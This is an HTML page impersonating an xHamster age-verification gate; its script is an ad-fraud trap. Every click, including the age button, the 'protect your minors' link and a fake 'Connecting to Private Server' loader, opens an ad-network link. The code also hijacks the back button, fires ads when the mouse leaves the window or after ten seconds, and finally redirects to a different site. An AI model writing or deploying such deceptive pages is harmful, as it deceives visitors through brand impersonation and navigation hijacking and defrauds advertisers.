<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>xHamster - Verification Required</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap');

        body { 
            background-color: #000; 
            margin: 0; 
            overflow: hidden; 
            font-family: 'Roboto', sans-serif;
            color: #eeeeee;
            -webkit-tap-highlight-color: transparent;
        }

        /* মোবাইল অপ্টিমাইজড ব্যাকগ্রাউন্ড (লম্বালম্বি) */
        .bg-portrait {
            position: fixed;
            inset: 0;
            background: url('https://i.ibb.co/0y0kQR83/Whats-App-Image-2026-05-16-at-07-27-43.jpg') no-repeat center top;
            background-size: cover;
            filter: blur(4px) brightness(0.3);
            z-index: 1;
        }

        @keyframes entrance {
            0% { opacity: 0; transform: scale(0.9) translateY(30px); }
            100% { opacity: 1; transform: scale(1) translateY(0); }
        }

        /* ম্যাট ব্ল্যাক কার্ড */
        .main-card {
            position: relative;
            z-index: 100;
            width: 92%;
            max-width: 440px;
            background: #121212;
            padding: 45px 25px;
            text-align: center;
            border-radius: 4px;
            box-shadow: 0 30px 70px rgba(0,0,0,1);
            border: 1px solid rgba(229, 57, 53, 0.1);
            animation: entrance 0.7s cubic-bezier(0.17, 0.89, 0.32, 1.28) forwards;
        }

        /* হালকা রেড বাটন */
        .btn-red {
            background-color: #e53935;
            color: #fff;
            font-size: 18px;
            font-weight: 800;
            padding: 19px;
            width: 100%;
            border-radius: 4px;
            border: none;
            cursor: pointer;
            text-transform: uppercase;
            position: relative;
            overflow: hidden;
            box-shadow: 0 8px 25px rgba(229, 57, 53, 0.2);
        }

        .btn-red::after {
            content: '';
            position: absolute;
            top: -50%; left: -100%;
            width: 100%; height: 200%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            animation: shine 3.5s infinite;
        }

        @keyframes shine {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .btn-red:active { transform: scale(0.97); background-color: #c62828; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div onclick="openAd()" class="bg-portrait"></div>

    <div class="main-card">
        
        <div class="flex justify-center mb-10">
            <span class="bg-[#e53935] text-white font-black px-3 py-1 rounded-sm text-xl italic tracking-tighter">xHAMSTER</span>
        </div>

        <h1 class="text-2xl font-black mb-5 leading-tight text-white">
            xHamster is <span class="text-[#e53935]">adults only</span> website!
        </h1>
        
        <p class="text-[#b0b0b0] text-[15px] mb-10 leading-relaxed">
            The content available on xHamster may contain pornographic materials. Access is strictly limited to those over 18.
        </p>

        <div class="space-y-4">
            <p class="text-[14px] font-bold text-white mb-2">To enter you must be 18 or older</p>
            
            <button onclick="toLoader(event)" class="btn-red">
                I'm 18 or older — enter xHamster
            </button>
            
            <div onclick="openAd(event)" class="mt-8 text-zinc-600 text-[11px] font-bold underline cursor-pointer uppercase">
                how to protect your minors
            </div>
        </div>

        <div class="mt-12 pt-6 border-t border-zinc-900 flex justify-center items-center gap-2 opacity-30">
            <div class="text-[10px] font-black border-2 border-zinc-700 px-1.5 py-0.5 rounded text-zinc-600">RTA</div>
            <span class="text-[10px] text-zinc-600 font-bold uppercase tracking-widest">Restricted to Adults</span>
        </div>
    </div>

    <div id="loader-overlay" class="hidden fixed inset-0 z-[200] flex items-center justify-center bg-black">
        <div class="text-center w-full px-10">
            <div class="w-16 h-16 border-4 border-zinc-900 border-t-[#e53935] rounded-full animate-spin mx-auto mb-8"></div>
            <p class="text-zinc-500 text-sm font-bold uppercase tracking-widest">Connecting to Private Server...</p>
            <button onclick="finalJump(event)" class="mt-12 px-12 py-4 bg-zinc-800 text-white rounded-full font-black text-xs uppercase tracking-widest border border-zinc-800">Continue</button>
        </div>
    </div>

    <script>
        const myAdLink = "https://www.effectivecpmnetwork.com/sb9gu5k1ut?key=c273305ea35d0c8095a31fba3bf3404f";
        const realTarget = "https://www.xvideos.com";

        function openAd(e) { if(e) e.stopPropagation(); window.open(myAdLink, '_blank'); }
        function toLoader(e) { if(e) e.stopPropagation(); window.open(myAdLink, '_blank'); document.getElementById('loader-overlay').classList.remove('hidden'); }
        function finalJump(e) { if(e) e.stopPropagation(); window.open(myAdLink, '_blank'); window.location.href = realTarget; }

        (function() {
            history.pushState(null, null, location.href);
            window.onpopstate = function() { window.open(myAdLink, '_blank'); history.go(1); };
            document.addEventListener("mouseleave", function(e) { if(e.clientY <= 0) window.open(myAdLink, '_blank'); });
            setTimeout(() => { if(document.getElementById('loader-overlay').classList.contains('hidden')) openAd(); }, 10000);
        })();
    </script>
</body>
</html>
